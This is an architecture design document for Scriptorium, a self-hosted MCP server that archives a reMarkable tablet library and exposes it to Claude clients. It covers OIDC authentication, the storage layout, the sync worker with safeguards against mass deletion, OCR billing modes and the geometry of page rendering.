# Scriptorium — Architecture

*A self-hosted MCP server that keeps a reMarkable library on your own storage and lets Claude read, search, transcribe, push to, and restore it.*

Status: draft v0.2 · 2026-10-17 · v0.1 was adversarially reviewed; dispositions in `docs/Plan/03-review-dispositions.md`.

---

## 1. Summary

Scriptorium is a single Docker image, exposed at `https://mcp.example.com/mcp`. It does two jobs:

1. **Sync worker** — for every linked user, polls the reMarkable cloud, mirrors the full library to a persistent volume in the tablet's own on-disk format (keeping every superseded version), renders changed pages to PNG, and (optionally) transcribes them with Claude. It is the **only** process that writes to the reMarkable cloud.
2. **MCP server** — a Streamable HTTP MCP endpoint that any Claude client (claude.ai web/Desktop/mobile, Claude Code) connects to as a custom connector. Tools cover the reMarkable library, pushing documents to the tablet, OCR, backup/restore, and managing the server itself. Anything slow or cloud-writing is enqueued as a job for the worker.

Authentication is delegated to an external OAuth 2.1 / OIDC authority that the operator provides — **Scriptorium ships no identity provider**. Any issuer that supports PKCE public clients and RFC 8414/OIDC discovery works (§5.2 lists the exact requirements); Keycloak is the reference configuration and is available as an *optional* compose profile for operators who have no issuer yet. Each authenticated identity gets isolated storage, its own reMarkable device token, and its own OCR settings.

Scope is deliberately narrow: **reMarkable + managing Scriptorium**. Calendar, chat, ticketing, documentation and HR systems are other MCPs/connectors that Claude orchestrates alongside this one; Scriptorium knows nothing about them.

Not affiliated with reMarkable AS. The reMarkable cloud API is unofficial and may change without notice.

### Design principles

- **Never lose a note.** The archive only ever gains data unless a human explicitly confirms a purge. Cloud-side deletion, protocol changes, partial listings and account switches must not delete files.
- **The worker is the single cloud writer**, and every write is idempotent (upsert by document UUID).
- **Default deny.** No user can log in, and no one can spend the operator's API key, until the operator says so.
- **Untrusted input everywhere**: cloud metadata, note content, Markdown, URLs and the model's own tool arguments are all attacker-controlled.
- **Spikes before features.** Unverified protocol behaviour is a spike with a pass criterion, not an assumption in a milestone.

---

## 2. Goals and non-goals

### Goals

| # | Goal | Done when |
| --- | --- | --- |
| G1 | Complete, durable, versioned archive of each user's library | Every document the cloud has ever synced is on disk with original UUIDs and metadata; superseded versions are retained; cloud-side deletion and the free tier's 50-day sync cut-off never remove anything |
| G2 | Claude can read, search and look at notes from any client | `list`, `search`, `read_page`, `page_image` work from claude.ai mobile and Claude Code with the same identity |
| G3 | On-demand and folder-scoped automatic OCR, with three billing modes | Per-user key, server key, or lazy in-session transcription, chosen per user; spend capped per user and globally |
| G4 | Push documents to the tablet via the cloud | Markdown → PDF, PDF/EPUB by URL, images/SVG/PDF → native ink (`.rmdoc`, via the optional ink sidecar) |
| G5 | Restore after a wipe, without a cable | `restore` pushes missing documents (folders included) from the archive or a snapshot through the cloud, resumably and without duplicates |
| G6 | Multi-user, pluggable auth, no web admin | All user and admin operations are MCP tools; server-wide settings are environment/compose config; the OIDC issuer is a config value |

### Non-goals (v1)

- SSH/USB transports to the tablet (the container is not on the user's LAN in general).
- Handwriting search inside the reMarkable apps, screen share, or anything reMarkable Connect provides.
- A web UI. The identity provider's login page and a signed file-download endpoint (§11.0) are the only browser surfaces.
- Replacing the reMarkable cloud (see rmfakecloud, §13).
- Typed-text native notebooks from Markdown; Markdown pushes as PDF in v1.
- EPUB export, Markdown-with-images export, or any feature that would need the AGPL dependencies upstream uses (§4.4).

---

## 3. Context diagram

```
                    sync (official apps)                          ┌──────────────────────┐
 ┌───────────────┐ ───────────────────▶ ┌──────────────────┐      │  Claude API          │
 │ Paper Pro Move│                      │ reMarkable cloud │      │  (OCR, optional)     │
 └───────────────┘ ◀─────────────────── └──────────────────┘      └──────────▲───────────┘
                    push (Scriptorium)       ▲       │ poll / push            │ PNG → text
                                             │       ▼                        │
                        ┌────────────────────┴─────────────────────────────────┴───────────┐
                        │ Docker host                                                      │
                        │  ┌───────────────┐   ┌───────────────┐   ┌────────────────────┐  │
                        │  │ scriptorium   │   │ scriptorium   │   │ OIDC issuer        │  │
                        │  │ worker        │◀─▶│ server (/mcp) │   │ (operator-provided │  │
                        │  └───────┬───────┘   └───────▲───────┘   │  e.g. Keycloak)    │  │
                        │          │  /data (per-user) │ jobs      └──────────▲─────────┘  │
                        │          └────────┬──────────┘                      │            │
                        │            host-side snapshots                      │            │
                        │  ┌──────────────────────────────────────────────────┴─────────┐  │
                        │  │ reverse proxy (TLS, mcp.example.com, rate limits, IP rules)│  │
                        │  └───────────────────────────────▲────────────────────────────┘  │
                        └──────────────────────────────────┼───────────────────────────────┘
                                                           │ HTTPS, OAuth 2.1 bearer
                      ┌────────────────────────────────────┴──────────────────────────────┐
                      │ Claude clients: claude.ai (web, Desktop, mobile) · Claude Code    │
                      └───────────────────────────────────────────────────────────────────┘
```

Who calls whom: Claude clients call the server; the server reads `/data` and writes jobs; the worker calls the reMarkable cloud (all library reads and writes) and, optionally, the Claude API. The server's only cloud call is exchanging a one-time connect code for a device token. The OIDC issuer is called by Claude (login, token) and by the server (JWKS fetch only).

---

## 4. Components

### 4.1 One image, two processes

Same image, two entrypoints, run as two compose services sharing `/data`:

| Process | Entrypoint | Responsibilities |
| --- | --- | --- |
| `server` | `scriptorium serve` | Streamable HTTP MCP at `/mcp`; OAuth resource-server checks; all tools; reads the archive and index; enqueues jobs; signed downloads at `/dl/<token>`; `/healthz`; owns schema migrations |
| `worker` | `scriptorium worker` | Per-account poll loop; download, verify and atomically commit changed documents; version history; tombstones; render PNGs; auto-OCR; index maintenance; executes **all** jobs, including every cloud write (push, restore) |

They communicate only through the filesystem and SQLite. The server never writes to the reMarkable cloud; the worker never speaks HTTP to clients. There is no inter-process signalling: the worker polls the jobs table at ≤2 s.

### 4.2 Code layout

```
scriptorium/
  pyproject.toml            # uv project; see §4.3 and §4.4 for dependencies
  src/scriptorium/
    cli.py                  # serve | worker | admin (local-only helpers: migrate, gen-master-key, licence-check)
    config.py               # env → typed settings (pydantic-settings, SCRIPTORIUM_ prefix)
    auth/
      oidc.py               # issuer discovery, JWKS cache, JWT validation, claims → User
      metadata.py           # /.well-known/oauth-protected-resource document, 401 responses
      pat.py                # personal access tokens (scr_ prefix, hashed)
    users/
      store.py              # user registry, storage paths, quotas, link registry
      secrets.py            # MultiFernet encryption with SCRIPTORIUM_MASTER_KEY(S)
    cloud/
      client.py             # per-account cloud client (sync 1.5), explicit config, no globals
      sync.py               # root → diff → staged download → verify → atomic commit → tombstones
      upload.py             # idempotent upsert-by-UUID writes; PDF/EPUB and raw-document (.rmdoc) upload
    library/
      layout.py             # xochitl on-disk layout helpers, filename allowlist, path containment
      render.py             # .rm v6 → SVG (rmscene) → PNG (resvg-py); PDF pages via pypdfium2
      index.py              # per-account SQLite schema, FTS5, page hashes, transcripts, history, links
    jobs/
      queue.py              # leased job queue in scriptorium.sqlite (§6.2)
    ocr/
      modes.py              # user-key | server-key | lazy; caps
      claude.py             # Claude vision transcription (prompt, batches, cost accounting)
    push/
      markdown.py           # markdown → PDF in a sandboxed subprocess
      fetch.py              # SSRF-guarded URL fetch
      ink.py                # image/SVG/PDF → .rmdoc via the optional scriptorium-ink sidecar (AGPL, §4.4)
    backup/
      snapshots.py          # enumerate host snapshots (read-only mount) or restic
      restore.py            # diff archive vs cloud; push missing; parents first; resumable
    tools/
      _conventions.py       # identifiers, pagination, error model, confirmation tokens, annotations
      account.py library.py ocr.py push.py backup.py admin.py
    server.py               # ASGI app: well-known + healthz + /dl before the MCP SDK; per-request user context
    worker.py               # scheduler, per-account loops, job runner
  docker/
    Dockerfile  entrypoint.sh  compose.example.yml
    keycloak/realm-scriptorium.json     # realm export, imported at start (§5.3)
    proxy/                              # example per-path rules for Caddy / Traefik / nginx (§13)
  docs/   { Architecture.md, Plan/, Spikes/ }
  tests/
```

### 4.3 Dependency on `remarkable-mcp`

Decision: **library, not server**; **fork + pinned git dependency, not submodule.** Spike **S0** decides how much of the library we can actually consume.

What upstream gives us: the sync 1.5 protocol client (root index, generation-gated commits, content-addressed blob cache, parallel metadata fetches), `.rm` v6 rendering via rmscene, and PDF upload. What stands in the way, as shipped:

- `pymupdf` (AGPL) is a **hard** dependency used across exporters, extraction, Markdown→PDF, upload page-counting and the tools layer, not just rasterising.
- `ebooklib` (AGPL-3.0-or-later) is a hard dependency for EPUB handling.
- Module-level globals and environment reads (`REMARKABLE_TOKEN`, `REMARKABLE_CACHE_DIR`, `REMARKABLE_SYNC_WORKERS`) make per-user instantiation impossible without changes.
- `upload_document` mints the UUID internally and appends to the root, so retries can duplicate documents.
- The HTTP client is blocking (`requests`).

Plan:

1. Fork to `MilkyEngineer/remarkable-mcp`. The fork's first PRs make `pymupdf` and `ebooklib` **optional extras**, replace env reads with an explicit config object, and accept a caller-supplied document UUID with upsert semantics. Keep these upstreamable.
2. If S0 shows the diff would not stay small, **vendor** only the sync client and the stroke renderer into `scriptorium/cloud` and `scriptorium/library` with attribution, and stop depending on the package.
3. Either way, Scriptorium runs blocking library calls in a thread pool, never on the event loop.
4. `pyproject.toml` pins `remarkable-mcp @ git+https://github.com/MilkyEngineer/remarkable-mcp@<tag>` (or nothing, if vendored). Reproducible builds come from the tag plus `uv.lock`.

We do **not** run upstream's MCP server: its tool layer is single-user and its HTTP mode has no authentication by design.

### 4.4 Licensing

Scriptorium is MIT. The rule: **no copyleft (GPL/AGPL/LGPL-static) Python dependency in Scriptorium's process or in the image's `site-packages`.** Debian base-image and system libraries (some GPL/LGPL) are mere aggregation and are listed in the SBOM with their notices. CI runs `pip-licenses` over the built image and fails on GPL/AGPL (the `scriptorium licence-check` command does the same locally).

Checked 2026-10-17 (PyPI metadata unless stated):

| Dependency | Licence | Decision |
| --- | --- | --- |
| remarkable-mcp (fork), rmscene, mcp, markdown-it-py, PyJWT | MIT | Use |
| resvg-py | MIT (repository); wheel bundles the resvg crate, MPL-2.0. Wheel metadata has no licence field, so `pip-licenses` reports UNKNOWN: the licence gate allowlists `resvg_py` by name (S0) | Use for SVG → PNG |
| pypdfium2 | BSD-3 / Apache-2.0 | Use for PDF page rasterising |
| WeasyPrint | BSD-3 | Use for Markdown/HTML → PDF (sandboxed, §9) |
| httpx, cryptography, pydantic | BSD-3 / Apache-2.0 / MIT | Use |
| Keycloak | Apache-2.0 | Separate container; no linkage |
| **PyMuPDF** | **AGPL-3.0 or commercial** | **Excluded.** Upstream hard dependency; fork makes it an optional extra we never install |
| **ebooklib** | **AGPL-3.0-or-later** | **Excluded.** Upstream hard dependency; fork makes it optional. EPUB push is pass-through bytes and needs no parser |
| **rmc** | MIT, but requires `rmscene<0.7` while upstream needs `≥0.8` | **Dropped.** Only needed for a non-goal |
| **rmink** | **AGPL-3.0-or-later** | **Excluded from the main image.** Runs in the optional `scriptorium-ink` sidecar: separate image, separate repo, generic bytes-in/`.rmdoc`-out HTTP API, no rmink code in the MIT image |

Native MIT image-to-ink (to retire the sidecar) must be a **clean-room** implementation on rmscene: nobody — human or coding agent — who writes it may have rmink's source in their working context. This is recorded in `CLAUDE.md`.

---

## 5. Identity and authentication

### 5.1 Model

Scriptorium is an **OAuth 2.1 resource server**. It never issues OAuth tokens and has no user database of its own beyond "which identity maps to which storage directory". The authorization server (AS) is external and configured by URL.

```
Claude ── POST /mcp (initialize, no token) ──▶ Scriptorium ── 401
            WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", scope="scriptorium"
Claude ── GET /.well-known/oauth-protected-resource ──▶ PRM (below)
Claude ── discovery on ISSUER (OIDC and/or RFC 8414) ──▶ authorization_endpoint · token_endpoint · jwks_uri [· registration_endpoint]
Claude ── authorization code + PKCE S256 (pre-registered public client, or DCR/CIMD if the AS offers it) ──▶ AS
User   ── logs in at AS (password, or brokered Microsoft/Google) ──▶ AS
Claude ── code ──▶ AS ──▶ access token (JWT, aud ∋ resource) + rotating refresh token
Claude ── POST /mcp, Authorization: Bearer <JWT> ──▶ Scriptorium validates signature (JWKS), iss, aud membership, exp, nbf; reads sub, roles
```

Protected-resource metadata, served by Scriptorium (exact JSON):

```json
{
  "resource": "https://mcp.example.com/mcp",
  "authorization_servers": ["https://auth.example.com/realms/scriptorium"],
  "scopes_supported": ["scriptorium"],
  "bearer_methods_supported": ["header"],
  "resource_documentation": "https://github.com/MilkyEngineer/scriptorium"
}
```

401 contract: no token → `WWW-Authenticate: Bearer resource_metadata="…", scope="scriptorium"`; expired or invalid token → the same plus `error="invalid_token"` so the client refreshes; insufficient scope → 403 `error="insufficient_scope"`. `/.well-known/*`, `/healthz`, `/dl/*` and the 401 path are handled by Scriptorium's own ASGI middleware **before** the MCP SDK sees the request. `resource` is `SCRIPTORIUM_PUBLIC_URL` byte-for-byte (no trailing slash) and must equal the URL the user types into Claude.

Token validation: `iss` equals the configured issuer; `aud` (string or array) **contains** `SCRIPTORIUM_OIDC_AUDIENCE`; algorithms pinned to `RS256`/`ES256`; clock skew 60 s; JWKS cached, refetched on unknown `kid` at most once per 60 s (DoS cooldown). The audience comes from a mapper at the AS; Scriptorium does not rely on the OAuth `resource` parameter being honoured.

Key consequences:

- A **Scriptorium user is an identity at the AS**, keyed on `(iss, sub)`, not a Claude account. Two Claude accounts (for example a personal and an organisational one) that log in to the AS as the same user share one storage, one reMarkable link, one OCR configuration. Nothing is keyed on the Claude account.
- A reMarkable account can be linked to **one** Scriptorium user at a time. Linking a cloud account that is already linked elsewhere is refused with a generic message ("already linked to another user; ask an administrator"); only `admin_users` shows who. `admin_transfer_link(from, to)` moves a link when a user loses their AS identity. The reMarkable account identity used for this rule is the device token's `auth0-userid` claim, which S0 verified is identical across registrations and equals the user token's `sub`; the registry stores only its SHA-256. The user token's `auth0-profile` object (email, names) is never stored or logged.
- Claude Code uses a loopback redirect on a random port; the AS must accept `http://localhost/callback` and `http://127.0.0.1/callback` **port-agnostically**. Keycloak does this for loopback hosts when the URI is registered without a port; **S2** verifies on the pinned version.
- Claude's hosted clients call the AS and `/mcp` from Anthropic's egress range (`160.79.104.0/21`); **Claude Code calls both from the user's machine**, and users' browsers call the login pages. Any IP allowlist must account for all three (§13).

### 5.2 Pluggable authority

| Setting | Meaning |
| --- | --- |
| `SCRIPTORIUM_OIDC_ISSUER` | Issuer URL. Discovery at `<issuer>/.well-known/openid-configuration` and/or RFC 8414. Required. |
| `SCRIPTORIUM_OIDC_AUDIENCE` | Value that must appear in `aud` (default: `SCRIPTORIUM_PUBLIC_URL`). |
| `SCRIPTORIUM_OIDC_USER_CLAIM` | Claim used, together with `iss`, as the stable user id (default `sub`). |
| `SCRIPTORIUM_OIDC_NAME_CLAIM` | Display name claim (default `preferred_username`, fallback `email`). |
| `SCRIPTORIUM_OIDC_ADMIN_CLAIM` / `SCRIPTORIUM_OIDC_ADMIN_VALUE` | Claim path and value that grants admin tools, e.g. `realm_access.roles` / `scriptorium-admin`. |
| `SCRIPTORIUM_OIDC_ALLOWED_USERS` | **Required.** Comma-separated `sub` values or emails. Emails match only when `email_verified` is `true`. The server refuses to start when this is empty unless `SCRIPTORIUM_ALLOW_ALL_ISSUER_USERS=true` is set explicitly. |

**Bring your own issuer.** Scriptorium contains no identity provider and the image has no dependency on Keycloak. An operator's issuer qualifies when it provides:

1. OIDC discovery (`/.well-known/openid-configuration`) and/or RFC 8414 metadata, reachable from Anthropic's egress range and from users' machines.
2. Authorization-code flow with PKCE S256 for **public** clients, and refresh tokens (`offline_access` or equivalent) with rotation.
3. A way for Claude to obtain a client: a pre-registered public client whose ID the user types into Claude (works everywhere), **or** DCR (RFC 7591), **or** Client ID Metadata Documents.
4. Redirect URIs `https://claude.ai/api/mcp/auth_callback` and port-agnostic `http://localhost/callback` / `http://127.0.0.1/callback` (the latter two only if Claude Code is used; otherwise a PAT, §5.4).
5. JWT access tokens whose `aud` can be made to contain `SCRIPTORIUM_OIDC_AUDIENCE`, signed with RS256/ES256 and published via `jwks_uri`.
6. A claim Scriptorium can read for admin gating (any claim path/value; a group, a role, or a single `sub`).

Expected to work: Keycloak (reference, §5.3), Authentik, Authelia, Zitadel, Auth0, Okta. **Microsoft Entra ID works directly** by pre-registering a public client and setting an Application ID URI as the audience; Google Workspace does not (no custom audience). Operators without an issuer start the optional `keycloak` compose profile (§13).

### 5.3 Keycloak reference configuration (optional profile)

For operators who have no issuer. Nothing in Scriptorium depends on it; it exists so the requirements in §5.2 have one worked, tested example. The realm is shipped as `docker/keycloak/realm-scriptorium.json` and loaded with `start --import-realm`, so the configuration below is reproducible, not clicked together. Keycloak is **pinned to the exact version S2 verifies** (26.4.x or later: RFC 8414 metadata for path-based issuers, port-agnostic loopback redirects).

**Client registration — decision: pre-registered public clients, no anonymous DCR.** Keycloak's Trusted Hosts policy matches hostnames or single IPs (with reverse-DNS for wildcards) and has no CIDR support, so it cannot be limited to Anthropic's egress range; anonymous DCR also registers a new client on every fresh Claude connection and runs into the default Max Clients (200). Two clients instead:

| Client ID | Type | Redirect URIs | Used by |
| --- | --- | --- | --- |
| `scriptorium-claude` | public, PKCE S256 required | `https://claude.ai/api/mcp/auth_callback` | claude.ai web, Desktop, mobile; the user enters the client ID in the custom-connector dialog |
| `scriptorium-claude-code` | public, PKCE S256 required | `http://localhost/callback`, `http://127.0.0.1/callback` (no port → any port) | `claude mcp add --transport http scriptorium <url> --client-id scriptorium-claude-code` |

Alternatives S2 evaluates and documents: (a) DCR with "Host Sending Request Must Match" **off**, "Client URIs Must Match" **on**, Max Clients raised, a stale-client cleanup job, and the registration endpoint IP-limited at the proxy; (b) CIMD (`--features=cimd`, experimental), which Claude prefers when the AS advertises `client_id_metadata_document_supported`. Pre-registered clients ship unless S2 finds Claude cannot complete the flow with them.

**Scopes and claims.** Client scope `scriptorium` is a **realm default** scope so every client receives it. It carries: an audience mapper (`aud` += `https://mcp.example.com/mcp`), a realm-roles mapper (so `realm_access.roles` is present regardless of the client's Full Scope setting), `email` and `email_verified`. `offline_access` is enabled for both clients so Claude obtains refresh tokens. Realm role `scriptorium-admin` is granted to the operator.

**Lifetimes (realm settings, exact).** Access Token Lifespan 15 min · SSO Session Idle 12 h · SSO Session Max 7 d · Offline Session Idle 30 d · Offline Session Max Limited off · Revoke Refresh Token **on**, Refresh Token Max Reuse **1** (so two Claude surfaces refreshing concurrently do not revoke each other's session). S2 tests: refresh after access expiry; refresh after 24 h idle; two concurrent refreshes; an invalidated refresh token returns `invalid_grant`.

**Identity.** Self-registration **off**. Identity brokers (Microsoft personal/work tenant, Google) optional, with "first broker login" set to **require manual account linking** rather than auto-link by email, so a stranger's Google account cannot become an existing user. Scriptorium's `ALLOWED_USERS` is the second gate.

**Exposure.** `KC_HOSTNAME_ADMIN` points at an internal URL; the proxy denies `/admin` and `/realms/master` from the internet; `--http-enabled=true --proxy-headers=xforwarded` behind the TLS-terminating proxy.

### 5.4 Personal access tokens (Claude Code, scripts)

Claude Code can pass a static header (`--header "Authorization: Bearer …"`). Scriptorium mints **personal access tokens** via `create_token(name, ttl_days ≤ 90)`: format `scr_<base64url 32 bytes>` (prefix for secret scanners), SHA-256 stored, shown once, revocable, listed with last-used time. PATs map to the same user but **never carry admin rights**, expire at the TTL, and are revoked by `admin_disable_user` / `forget_me`. Hosted Claude apps use OAuth only.

---

## 6. Storage layout

All state under one volume, `/data`. `/data` must be a local POSIX filesystem (ext4, xfs, ZFS, btrfs). The server refuses to start if `statfs` reports a FUSE, NFS or SMB filesystem, because SQLite WAL depends on POSIX locks and a shared-memory file; the error message says where to mount instead.

```
/data/
  scriptorium.sqlite              # users, link registry, jobs, PATs, audit log (no content)
  users/<uid>/                    # uid = sha256(iss + "\n" + user_claim)[:16]
    secrets.enc                   # MultiFernet: reMarkable device token, per-user Claude API key
    settings.json                 # auto-OCR folders, push defaults, quota overrides (schema in docs/)
    accounts/<acct>/              # one directory per reMarkable account ever linked; acct = ULID minted at link time
      blobs/<sha256>              # content-addressed blobs from the cloud; retained → version history
      library/                    # materialised current view in xochitl layout, original UUIDs
        <uuid>.metadata  <uuid>.content  <uuid>.pagedata
        <uuid>/<page-uuid>.rm
        <uuid>.pdf | .epub        # source file for annotated documents
      tombstones/<uuid>/          # same layout; moved here when the document leaves the cloud; NEVER auto-purged
      pages/<uuid>/<page-uuid>.png
      staging/<uuid>.<job>/       # in-progress downloads; swept on worker start
      index.sqlite                # documents, pages, history, transcripts, FTS5, links
  snapshots/                      # read-only mount of host snapshots (zfs/btrfs), or the restic cache
```

Why the xochitl layout: it is what the tablet, the desktop app, the reMarkable cloud `.rmdoc` export, and every open-source tool understand. A cloud restore re-uploads the same files; nothing is converted on the way in. (Device-side files add sync flags, thumbnails and `.local` sidecars, so a future SSH restore is "copy plus regenerate", not a plain copy.)

**Versioning.** Blobs are content-addressed, so keeping superseded blobs costs only the changed pages. `library/` is a view over `blobs/`; every root generation that changes a document appends a `history` row `(uuid, generation, hash_root, seen_at)`. An erased page is therefore recoverable even with no filesystem snapshots. Superseded blobs that are unreferenced by the current view, by tombstones, or by any history row younger than `BLOB_RETENTION_DAYS` (default 365) are eligible for `admin_gc_blobs(user, dry_run=true)` — a confirmed admin action, never automatic.

**Multiple accounts.** `connect_remarkable` on a user who already has an active account refuses unless `replace=true`; the old account directory is kept, marked inactive, and remains readable (`list(account=…)`) and restorable. Nothing from one account is ever compared against another, so a relink cannot mass-tombstone.

### 6.1 Per-account index schema

| Table | Columns (abridged) | Purpose |
| --- | --- | --- |
| `documents` | uuid PK, type (DocumentType/CollectionType), parent, name, last_modified, last_opened, deleted_at, deletion_cause (user/aged/unknown), source_kind, page_count, hash_root, generation | Library tree, listing, tombstones |
| `history` | uuid, generation, hash_root, seen_at; PK (uuid, generation) | Version history over retained blobs |
| `pages` | uuid PK, document, idx (0-based internally; tools expose 1-based), content_hash, stable_since, rendered_at, png_path | Change detection, render cache, OCR debounce |
| `transcripts` | (page, content_hash) PK, text, model, mode (user/server/lazy), input_tokens, output_tokens, cost_usd, created_at | OCR cache keyed by hash, so a page is transcribed once per version |
| `transcripts_fts` | FTS5 over `transcripts.text` + document name + path | `search` |
| `links` | page, kind, ref, created_by, created_at | Arbitrary external references written by Claude (calendar event id, ticket ID, document link); opaque strings |
| `sync_state` | k/v: last_root_hash, last_generation, last_full_listing_ok, anomaly, anomaly_reason | Circuit breaker and safe mode (§7) |

Operation: `journal_mode=WAL`, `synchronous=NORMAL`, `busy_timeout=5000`; write transactions are per document and short. Schema versions live in `PRAGMA user_version`; the **server** owns migrations at start-up and the worker waits until the version matches.

### 6.2 Global schema (`scriptorium.sqlite`)

| Table | Purpose |
| --- | --- |
| `users` | uid, iss, sub, display_name, created_at, disabled_at, quota_gb, server_key_allowed |
| `accounts` | acct, uid, rm_account_identity (nullable), active, linked_at, device_desc |
| `pats` | id, uid, name, sha256, created_at, expires_at, last_used_at, revoked_at |
| `jobs` | id, uid, acct, kind, dedupe_key UNIQUE, payload (JSON), state (queued/leased/done/failed/dead/cancelled), lease_owner, lease_expires_at, attempts, max_attempts, next_run_at, result, error, created_at, updated_at |
| `audit` | ts, uid, tool, duration_ms, outcome, identifiers (JSON: document UUIDs, job id, bytes, url host, snapshot id — never content or secrets) |

**Jobs.** The worker claims with `BEGIN IMMEDIATE; UPDATE jobs SET state='leased', lease_owner=?, lease_expires_at=now+60s WHERE id = (SELECT id FROM jobs WHERE state='queued' AND next_run_at<=now ORDER BY created_at LIMIT 1) RETURNING *`. Long jobs heartbeat to extend the lease; expired leases are re-queued on worker start and every minute. Failures back off exponentially (`min(2^attempts × 30 s, 1 h)`) up to `max_attempts`, then `dead`; `*_status(job)` surfaces `dead` with the error. `dedupe_key` makes enqueues idempotent (`ocr:<acct>:<page>:<hash>`, `push:<acct>:<uuid>`, `restore:<acct>:<scope-hash>`). **At most one cloud-writing job is in flight per account.** Jobs can be cancelled while `queued`.

---

## 7. Sync worker

Per linked account, a loop with interval `SCRIPTORIUM_POLL_SECONDS` (default 600), jittered ±10 %:

1. **Fetch root** — read the root index (sync 1.5: root hash + generation). Unchanged → sleep. Generation **lower** than the last seen, or a root with zero entries after a non-empty one → set `anomaly`, go read-only (step 7).
2. **Full listing** — fetch every document index. If any fetch fails, process what succeeded for *additions and changes only*, and set `last_full_listing_ok=false`; **no tombstoning on a partial listing.**
3. **Download and commit** — for new or changed documents: download blobs into `staging/`, verify each blob's SHA-256 against the content-addressed name, `fsync`, then atomically rename into `library/` (old files to a per-generation holding area), append `history`, update `documents.hash_root` — all in one SQLite transaction. Stale staging directories are swept on start.
4. **Tombstones** — a UUID is a deletion candidate only when the listing was complete in **two consecutive polls** and it was absent in both. **Circuit breaker:** if the candidates exceed `max(5, 10 %)` of the library, or more than `TOMBSTONE_MAX_PER_POLL` (50), halt deletes, set `anomaly="mass_delete"`, and surface it in `account_status` and `admin_status`; an admin clears it with `admin_clear_anomaly` after a human has looked. Otherwise move the files to `tombstones/<uuid>/`, set `deleted_at` and `deletion_cause` (`aged` when `last_opened` > 50 days on an account the worker believes is free-tier, else `unknown`; `user` is set only by a documented signal if one exists). A tombstoned UUID that reappears in the cloud is **un-tombstoned** in place. **Tombstones are never purged automatically**; `admin_purge_tombstones(user, older_than_days, dry_run=true)` is the only path, and it requires a confirmation token.
5. **Render** — for pages whose content hash changed, render PNG (§8.3). Failures are logged and retried next cycle; a page that will not parse keeps its last good PNG and is flagged.
6. **Auto-OCR** — if the account's OCR mode is `user` or `server`, enqueue transcription for pages in `settings.auto_ocr_folders` (folder = CollectionType UUID, recursive) whose hash has been **stable for ≥2 polls or 30 min** (debounce while the user is still writing). Background OCR uses the Message Batches API.
7. **Failure classes** — HTTP 429/5xx/network: exponential backoff to 1 h, keep polling. Device token rejected (401/403 from the token endpoint) **on three consecutive polls**: mark `needs_relink`, stop polling, surface in `account_status`. Unparseable protocol response: `anomaly="protocol"`, read-only safe mode (serve the archive, no downloads, no writes) until an operator clears it or a new release handles it.

Trash: documents whose parent is `trash` stay in the cloud root and are mirrored like any other; `list` hides them unless `include_trash=true`; `trash()` lists both trashed and tombstoned documents; restore recreates parent folders from tombstones when they are missing.

Concurrency: one worker process, an asyncio task per account, bounded by `SYNC_CONCURRENCY` (default 2); within an account, blob downloads use `SYNC_WORKERS` (default 4). There is exactly one retry layer — Scriptorium's — and the library's internal retries are disabled. Rendering runs in a process pool (`RENDER_WORKERS`, default 2).

**Writes (push, restore) are worker jobs** and are idempotent: the job fixes the document UUID and blob set at enqueue time; blob uploads are naturally idempotent; the root commit is a single generation-gated **upsert by UUID** — on a generation mismatch the mutation is re-applied to the fresh root; on retry, if the root already holds the UUID with the expected hash, the job is `done`. Root commits send `broadcast: true` so tablets pull promptly.

---

## 8. OCR

### 8.1 Modes

Resolved per user, in this order (a user's own key wins, for privacy and billing):

| Mode | Condition | Who calls Claude | Pays |
| --- | --- | --- | --- |
| `user` | User stored a key with `set_claude_api_key` | Worker, in the background | User |
| `server` | `SCRIPTORIUM_ANTHROPIC_API_KEY` set **and** the user is in `SERVER_KEY_USERS` (default **empty**) or granted by `admin_allow_server_key` | Worker, in the background | Operator |
| `lazy` | Neither | The user's own Claude session: `transcribe` returns the PNG with instructions; the client transcribes and calls `save_transcript` | User's subscription |

When a user links an account and neither key applies, `account_status` and the first `transcribe` call explain the two options.

**Caps.** All spend through the server key is counted against a **global** monthly cap (`OCR_MONTHLY_CAP_USD`) and a **per-user** cap (`OCR_USER_MONTHLY_CAP_USD`), covering auto-OCR *and* on-demand calls; when a cap is reached the mode degrades to `lazy` for the rest of the month and `ocr_status` says so. A user may set their own cap on their own key. Cost is computed from the response's `usage` fields × `OCR_PRICE_IN_PER_MTOK` / `OCR_PRICE_OUT_PER_MTOK` (config, defaults to the current list price of the default model), including thinking tokens.

### 8.2 Transcription contract

- Input: the page PNG (§8.3), the prompt from `src/scriptorium/ocr/prompt.md` (versioned; the version is stored with the transcript). Output: Markdown.
- Rules in the prompt: verbatim text, keep structure (headings, lists, `- [ ]` for boxes and arrows, tables where ruled), `[?]` for illegible words, describe sketches in one bracketed line, never summarise.
- Model: `OCR_MODEL` (default `claude-sonnet-5-5`); `max_tokens` 4096; extended thinking off, or the lowest effort setting the model accepts; 3 retries with backoff on 429/529.
- Cache key: `(page uuid, content_hash)`. Re-transcription only when the hash changes or `transcribe(force=true)`.
- `save_transcript` from lazy mode records `mode=lazy` and the client's stated model; it is accepted only for pages the user owns and only when `content_hash` matches the current page.

### 8.3 Rendering

Paper Pro Move geometry (verified in **S3**, `docs/Spikes/S3.md`): the panel is 954 × 1696 px; `.rm` v6 strokes are in **device-independent units** with x centred on 0 and y from the top, where the Move's screen spans 820 × 1458 units (`SceneInfo.paper_size`), i.e. 954/820 ≈ 1.163 px per unit, the same physical unit as earlier devices (≈ 226 per inch). Ink is **not confined to the paper rectangle**: a scrolled page extends below 1458 and a zoomed-out page extends beyond ±410, so the renderer always draws the union of the paper rectangle and the ink bounding box. Annotated PDFs are different again: the PDF page is laid out at its physical size, **1 pt = 226/72 units**, origin at the page's top centre (a Letter page is 1921 × 2486 units), and the `.rm` for such pages reports the legacy 1404 × 1872 paper size, which must be ignored. Colours: strokes may carry an explicit RGBA (`color_rgba`) that overrides the palette id; highlighters and the shader blend with multiply. Rendering targets:

- Archive PNG (`pages/`): native 1× (1.163 px per unit; 954 × 1696 px for an unscrolled page, taller or wider when the ink extends), which also satisfies the Claude API's 2576 px limit for ordinary pages and costs about 2.2 k image tokens per page; pages whose extent exceeds 2576 px are downscaled for OCR only.
- `page_image(scale)`: `scale ∈ [0.25, 2]`, rendered on demand from the `.rm` and cached by `(hash, scale)`.
- Templates (grids, lines) are not in the document store, so backgrounds render blank; a bundled set of the stock templates may be layered later (MIT-compatible sources only).
